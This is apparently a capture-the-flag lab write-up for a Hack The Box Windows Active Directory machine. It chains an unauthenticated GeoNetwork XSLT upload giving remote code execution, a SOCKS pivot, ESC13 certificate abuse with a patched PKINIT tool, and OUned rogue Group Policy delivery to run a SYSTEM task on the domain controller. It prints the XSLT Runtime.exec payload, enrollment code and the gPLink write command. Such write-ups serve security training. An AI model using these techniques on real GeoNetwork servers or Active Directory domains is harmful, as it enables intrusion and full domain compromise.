# Airways — HTB Write-up

**Author:** DonMorpheus (lab)
**Machine:** Airways (Release Arena, Windows AD)
**Host:** `geo.airways.htb` / `airways.htb`
**Scope:** HTB VPN / personal lab only

> **No flags** in this document.

Scripts: [`scripts/`](scripts/).

---

## TL;DR

| Phase | Vector |
|-------|--------|
| Recon | 22, 80, 3000. HTTP Host `geo.airways.htb` is GeoNetwork 4.4.11. `:3000` is chat, not the app. |
| Foothold | Unauth formatter ZIP (`view.xsl` + `config.properties`) → Saxon `Runtime.exec`. CVE-2026-63219 / CVE-2026-58400. |
| Pivot | SOCKS from GN01 `192.168.100.2` into DC `.1` / WKSTN01 `.3`. |
| User | `Isabel.O` (temp password → must change). Local admin on **WKSTN01 only**. `user.txt` there. |
| ESC13 | Template `GroupPolicy_Audit` is ECDSA P-256 + TameMyCerts. Native CertEnroll. PKINIT PAC extra SID `GPO-Auditors` (LDAP group is empty). |
| Root | `gPLink` WRITE on `OU=IT` → OUned user Immediate Task. Process that GPO **on DC01** by RDPing as Isabel. SYSTEM task on the DC copies `root.txt` / DCSync. |

```
Kali tun0
  └─ 80 GeoNetwork 4.4.11  unauth XSLT
        └─ SOCKS  192.168.100.0/24
              WKSTN01  OU=Servers     Isabel local admin
              DC01     OU=Domain Controllers
              users in OU=IT  (Isabel, Owen, …)
                    ESC13 PKINIT → gPLink OU=IT
                    OUned fake LDAP + GPT on \\WKSTN01\share
                    Isabel RDP DC01 → SYSTEM Immediate Task on DC
```

---

## 1. Recon

```bash
echo '<TARGET_IP> geo.airways.htb airways.htb chat.airways.htb' | sudo tee -a /etc/hosts
nmap -sC -sV <TARGET_IP>
```

Open from VPN: **22**, **80**, **3000**. ICMP TTL 127. `:443` resets. nmap OS looks Linux because the public NIC is GN01/nginx.

| Port | What |
|------|------|
| 80 | nginx → `http://geo.airways.htb/geonetwork` |
| 3000 | Express/Rocket.Chat-like (`chat.airways.htb`, cert from `AIRWAYS-DC01-CA`) |
| 22 | OpenSSH on Debian (GN01) |

Internal (after SOCKS):

| Host | IP | Role | Computer OU |
|------|-----|------|-------------|
| DC01 | `192.168.100.1` | Server 2022, AD, ADCS | `OU=Domain Controllers` |
| GN01 | `192.168.100.2` | GeoNetwork | (Linux) |
| WKSTN01 | `192.168.100.3` | Win10, RDP, SMB | `OU=Servers` |

`OU=IT,OU=Departments` holds **users** (Isabel, Owen, …). It does **not** hold WKSTN01 or DC01. That layout is the whole box.

---

## 2. GeoNetwork unauth XSLT

`GET /geonetwork/srv/api/site` unauthenticated: platform **4.4.11**.

Formatter ZIP upload is pre-auth if you send the catalog.search session:

```
GET  /geonetwork/srv/eng/catalog.search          →  JSESSIONID + XSRF-TOKEN
POST /geonetwork/srv/api/formatters              →  201  (zip: view.xsl + config.properties)
GET  /geonetwork/srv/api/records/<UUID>/formatters/<name>
```

`config.properties`: `applicableSchemas=all`, `published=true`. Trigger UUID is any **public** record (the “Terminal 3 Expansion” one works).

Saxon 2.0 drops unused variables. Force the side effect into the output:

```xml
<xsl:stylesheet version="2.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:rt="java:java.lang.Runtime">
  <xsl:template match="/">
    <ok>
      <xsl:value-of select="rt:exec(rt:getRuntime(), $cmd)"/>
    </ok>
  </xsl:template>
</xsl:stylesheet>
```

`Runtime.exec(String)` is the sink that actually returns 200. ProcessBuilder / `Files.copy` often 400. Put the command in an `xsl:variable` text node so XML quoting of `bash -c` does not blow up.

Static `chisel` (Go) as reverse SOCKS from GN01 is enough. The SOCKS listener is `127.0.0.1:1080` on Kali.

`scripts/01-geonetwork-rce.py` + `scripts/formatter/`.

---

## 3. User (Isabel / WKSTN01)

The intended user path is: GN01 → AODB ingest / Gabby → Owen NTLM → Rocket.Chat → Isabel **temporary** password (`STATUS_PASSWORD_MUST_CHANGE`) → `smbpasswd` / `impacket-changepasswd` → Isabel is **local admin on WKSTN01**.

Isabel is **not** admin on DC01. SMB `C$` / WinRM there fail. `user.txt` is `C:\Users\Administrator\Desktop\user.txt` **on WKSTN01**.

Useful groups (LDAP):

| User | Groups |
|------|--------|
| `Isabel.O` | Domain Users, **Remote Desktop Users** (Builtin, lives on the DC), Platform Engineers, **GP Management** |
| `Owen.F` | Domain Users, **ITAdmins** |

`GP Management` = “Allow Group Policy Linking for Servers”. That is **not** enough by itself to write `gPLink` on `OU=IT` over NTLM. The write shows up after ESC13.

---

## 4. ESC13 — `GroupPolicy_Audit`

ADCS template `GroupPolicy_Audit`:

- ECDSA_P256
- TameMyCerts policy module
- Issuance policy OID maps to **GPO-Auditors**
- Authenticated users can enroll

**Certipy / RSA CSRs are rejected.** Enroll on WKSTN01 **as Isabel**:

```powershell
# CertEnroll COM (template supplies the EC key)
$req = New-Object -ComObject X509Enrollment.CX509CertificateRequestPkcs10
$req.InitializeFromTemplateName(1, 'GroupPolicy_Audit')
$enroll = New-Object -ComObject X509Enrollment.CX509Enrollment
$enroll.InitializeFromRequest($req)
$enroll.Enroll()
$enroll.CreatePFX('<PFX_PASS>', 0)

# or
Get-Certificate -Template GroupPolicy_Audit -CertStoreLocation Cert:\CurrentUser\My -Url ldap:
Export-PfxCertificate ...
```

`scripts/02-enroll-esc13.ps1`. Run it from a process in Isabel’s logon session (`schtasks /RU AIRWAYS\Isabel.O /IT`, or RDP).

PKINIT: stock `PKINITtools/gettgtpkinit.py` signs CMS with RSA-SHA1. For this cert:

- digest **SHA-256**
- signature OID **`1.2.840.10045.4.3.2`** (ecdsa-with-SHA256)
- optional `KRB_SKEW_SEC` if Kali clock is hours off the DC

Patch: `scripts/pkinit-ecdsa.patch`.

The LDAP group **GPO-Auditors is empty**. The extra SID is **only in the PKINIT PAC**. NTLM `bloodyad` as Isabel → `INSUFF_ACCESS_RIGHTS` on `gPLink`. Kerberos with the ccache:

```bash
export KRB5CCNAME=./isabel.ccache
proxychains4 bloodyad -d airways.htb -k --host DC01.airways.htb \
  set object 'OU=IT,OU=Departments,DC=airways,DC=htb' gPLink \
  -v '[LDAP://cn={GUID},cn=policies,cn=system,DC=FAKEDC,DC=airways,DC=htb;0]'
```

Writable after ESC13: **`OU=IT` `gPLink: WRITE`** plus ADIDNS `CREATE_CHILD`. That is the OUned setup.

---

## 5. OUned — what actually has to happen

Synacktiv [OUned](https://github.com/synacktiv/OUned): rogue GPC on a fake machine account (`FAKEDC$` + LDAP/CIFS/HOST SPNs + AES256/NT), ADIDNS A to tun0, LDAP :389 on the attacker, GPT served over SMB.

### Why computer GPO never fires

| Object | OU | Applies computer GPO from `OU=IT`? |
|--------|-----|-------------------------------------|
| DC01 | Domain Controllers | no |
| WKSTN01 | Servers | no |
| (nothing) | IT | no computers |

`command-type=computer` is a no-op. The GPO must be **user** configuration (`ImmediateTaskV2`) so it applies to people in `OU=IT` **wherever they log on**.

### Why `gpupdate` on WKSTN01 as Owen looks like a miss

gpblib still emits `runAs=NT AUTHORITY\SYSTEM` / `logonType=S4U` even with `command-type=user`. That registers a SYSTEM Immediate Task **on the machine that processed the user GPO**.

| Who processed GPO | Where | Task identity | `\\DC01\C$\...\root.txt` |
|-------------------|-------|---------------|--------------------------|
| Owen / Isabel `gpupdate` on WKSTN01 | WKSTN01 | `WKSTN01$` | Access denied |
| Impersonate Owen on WKSTN01 | WKSTN01 | Owen | Access denied — **Owen is not DA** |
| **Isabel RDP logon on DC01** | **DC01** | **SYSTEM on DC** | **reads `root.txt`** |

DC local Administrators = `Administrator`, `Domain Admins`, `Enterprise Admins`. `ITAdmins` is **not** nested there. Copying `C$` as Owen was never going to work. The Discord one-liner that copies `\\192.168.100.1\C$\Users\Administrator\Desktop\root.txt` is the SYSTEM task **after** the user GPO ran **on the DC**.

### Why the SMB leg died on Kali

OUned’s embedded SMB is **scapy raw sockets**. `proxychains` does not wrap it, and Kali has no L3 route to `192.168.100.1`. Health-check to the GPT path hangs.

Fix: `smb-mode=domain`, host GPT on a share the clients can already reach:

```ini
[SMB]
smb-mode=domain
smb-ip=192.168.100.3
smb-share=ouned
```

On WKSTN01 (SYSTEM / local admin):

```
net share ouned=C:\ouned /grant:everyone,FULL
```

`gPCFileSysPath` becomes `\\192.168.100.3\ouned`. DC01 (and Isabel) can read it on the internal LAN. Attacker LDAP stays on tun0:389. Put `localnet 10.10.15.0/24` in proxychains so health-checks to tun0:389 are not proxied.

Operator bind stays **NTLM** (Isabel password). The `gPLink` write is a separate `bloodyad -k` with the PKINIT ccache — OUned NTLM will report `INSUFF_ACCESS_RIGHTS` and should keep the LDAP listener up.

### How you know it applied

Isabel is in **Builtin Remote Desktop Users** and `SeRemoteInteractiveLogonRight` on DC01. She cannot batch/interactive-local on the DC; **RDP is the logon type**.

```bash
# SOCKS + NLA
xfreerdp3 /v:192.168.100.1 /u:Isabel.O /d:AIRWAYS /p:'<pass>' \
  /proxy:socks5://127.0.0.1:1080 /cert:ignore /sec:nla
```

On DC01, `Microsoft-Windows-GroupPolicy/Operational`:

- Event 4001 — *Starting user logon Policy processing for AIRWAYS\Isabel.O*
- Event 5017 — file access `\\192.168.100.3\ouned\gpt.ini` as Isabel
- Event 8001 — *Completed user logon policy processing*

`gpresult /user AIRWAYS\Isabel.O /scope user /r` shows applied GPO **SCAPY LDAP** (OUned `displayName`). Immediate Task `OneDrive Telemetry` runs as SYSTEM, copies `root.txt` to `C:\Users\Public`, then deletes itself (`DeleteExpiredTaskAfter PT0S`).

`copy /Y` keeps the source timestamp, so `Public\root.txt` looks older than the logon. Look at presence, not mtime.

DCSync / `secretsdump` as SYSTEM on DC01 is the same foothold. PTH Administrator is cleanup, not a second vuln.

---

## 6. Traps / dead ends

| Looks real | Why it wastes time |
|------------|-------------------|
| `:3000` Zapier/chat | Not GeoNetwork. App is HTTP/80 `/geonetwork`. |
| Computer GPO on `OU=IT` | No computers in that OU. |
| Owen `ITAdmins` + `C$` on DC | Not a DC local admin. |
| Impersonate Owen / CreateProcessWithTokenW | Double-hop, or still no `C$` ACL. |
| NTLM `gPLink` | Extra SID is PKINIT-only. |
| Certipy ESC1/ESC13 RSA | TameMyCerts + ECDSA template. |
| OUned SMB on tun0:445 | scapy bypasses SOCKS. |
| `Webhook Compatibility - TEMP` on `OU=Servers` | `LmCompatibilityLevel` for a Rocket.Chat ticket. Decoy. |
| Kernel LPE / “doors” on WKSTN01 | You already have SYSTEM there. Root is the DC. |

---

## 7. Replay (lab)

1. Formatter RCE + SOCKS (`01-geonetwork-rce.py`).
2. Change Isabel’s expired password, confirm `Pwn3d` on WKSTN01.
3. Enroll `GroupPolicy_Audit` as Isabel (`02-enroll-esc13.ps1`).
4. Patched `gettgtpkinit.py` → `KRB5CCNAME`.
5. Add `FAKEDC$` + SPNs + DNS A, share `\\WKSTN01\ouned`, start OUned with `ouned.example.ini`.
6. `03-gplink.sh` (Kerberos).
7. `04-rdp-dc.sh` — wait for Event 8001 / `Public\root.txt`.

Educational / HTB lab only.
